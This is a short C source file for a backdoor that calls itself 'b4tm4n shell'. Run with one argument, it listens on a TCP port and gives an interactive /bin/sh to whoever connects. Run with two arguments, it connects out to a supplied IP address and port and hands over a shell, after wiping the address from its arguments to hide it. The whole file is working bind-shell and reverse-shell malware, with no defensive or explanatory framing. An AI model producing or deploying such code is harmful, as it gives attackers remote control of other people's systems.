#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <unistd.h>
int main(int argc,char *argv[]){
	int s,c,o=1;
	struct sockaddr_in i;
	if(argc==2){
		i.sin_family=AF_INET;
		i.sin_port=htons(atoi(argv[1]));
		i.sin_addr.s_addr=htonl(INADDR_ANY);
		s=socket(AF_INET,SOCK_STREAM,0);
		setsockopt(s,SOL_SOCKET,SO_REUSEADDR,&o,sizeof(o));
		if(!s)exit(0);
		bind(s,(struct sockaddr *)&i,0x10);
		listen(s,5);
		c=accept(s,0,0);
		send(c,"b4tm4n shell : connected\n",24,0);
		dup2(c,0);
		dup2(c,1);
		dup2(c,2);
		system("export TERM=xterm;PS1='$PWD>';export PS1;exec /bin/sh -i");
		close(c);
	}
	else if(argc==3){
		i.sin_family=AF_INET;
		i.sin_port=htons(atoi(argv[1]));
		i.sin_addr.s_addr=inet_addr(argv[2]);
		bzero(argv[2],strlen(argv[2])+1+strlen(argv[1]));
		s=socket(AF_INET,SOCK_STREAM,IPPROTO_TCP);
		if((connect(s,(struct sockaddr *)&i,sizeof(struct sockaddr)))<0)exit(0);
		send(s,"b4tm4n shell : connected\n",24,0);
		dup2(s,0);
		dup2(s,1);
		dup2(s,2);
		system("export TERM=xterm;PS1='$PWD>';export PS1;exec /bin/sh -i");
		close(s);
	}
}
